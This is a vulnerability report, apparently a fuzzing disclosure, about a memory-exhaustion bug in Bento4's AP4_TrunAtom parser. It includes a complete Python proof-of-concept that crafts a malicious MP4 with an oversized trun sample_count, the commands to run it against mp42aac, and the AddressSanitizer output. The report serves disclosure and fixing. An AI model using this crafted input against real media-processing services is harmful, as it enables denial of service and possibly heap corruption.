## Bug0: AP4_TrunAtom unchecked SetItemCount failure causes memory exhaustion and crash

In `AP4_TrunAtom::AP4_TrunAtom` (`Ap4TrunAtom.cpp`, lines 127-151), the return value of `m_Entries.SetItemCount(sample_count)` is never checked after reading a caller-controlled `sample_count` from the trun box, allowing an attacker to trigger a ~4 GB allocation that exhausts available memory and crashes the process.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload

def build_ftyp():
    payload = b"isom"
    payload += struct.pack(">I", 0)
    payload += b"isom" + b"iso2" + b"mp41"
    return box(b"ftyp", payload)

def build_mvhd():
    payload = b"\x00"
    payload += b"\x00\x00\x00"
    payload += struct.pack(">I", 0)
    payload += struct.pack(">I", 0)
    payload += struct.pack(">I", 1000)
    payload += struct.pack(">I", 0)
    payload += struct.pack(">i", 0x00010000)
    payload += struct.pack(">H", 0x0100)
    payload += b"\x00" * 10
    payload += struct.pack(">III", 0x00010000, 0, 0)
    payload += struct.pack(">III", 0, 0x00010000, 0)
    payload += struct.pack(">III", 0, 0, 0x40000000)
    payload += b"\x00" * 24
    payload += struct.pack(">I", 2)
    return box(b"mvhd", payload)

def build_moov():
    return box(b"moov", build_mvhd())

def build_mfhd():
    payload = b"\x00"
    payload += b"\x00\x00\x00"
    payload += struct.pack(">I", 1)
    return box(b"mfhd", payload)

def build_tfhd(track_id=1):
    payload = b"\x00"
    payload += b"\x00\x00\x00"
    payload += struct.pack(">I", track_id)
    return box(b"tfhd", payload)

def build_trun():
    payload = b"\x00"
    payload += b"\x00\x00\x01"
    payload += struct.pack(">I", 0x10000000)  # malicious sample_count
    payload += struct.pack(">i", 0)
    return box(b"trun", payload)

def build_traf():
    return box(b"traf", build_tfhd() + build_trun())

def build_moof():
    return box(b"moof", build_mfhd() + build_traf())

def build_mdat():
    return box(b"mdat", b"")

ftyp = build_ftyp()
moov = build_moov()
moof = build_moof()
mdat = build_mdat()
mp4 = ftyp + moov + moof + mdat

with open("poc_input.mp4", "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:soft_rss_limit_mb=400:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: specified RSS limit exceeded, currently set to soft_rss_limit_mb=400
    #0 0x... in operator new(unsigned long) asan_new_delete.cpp:99
    #1 0x... in AP4_ContainerAtom::ReadChildren(AP4_AtomFactory&, AP4_ByteStream&, unsigned long long)
SUMMARY: AddressSanitizer: rss-limit-exceeded ../../../../src/libsanitizer/asan/asan_new_delete.cpp:99 in operator new(unsigned long)

### Impact

An attacker who supplies a crafted MP4 file with a trun box carrying `sample_count=0x10000000` causes `AP4_TrunAtom` to attempt a ~4 GB heap allocation (`268435456 * 16` bytes) with no upper-bound check, exhausting physical memory and crashing the process. This exposes a denial-of-service condition on any mp42aac invocation that processes an untrusted MP4 file. On 32-bit builds the multiplication `sample_count * sizeof(Entry)` can overflow to a small value, resulting in a subsequent heap buffer overflow with potential for heap corruption beyond a crash.
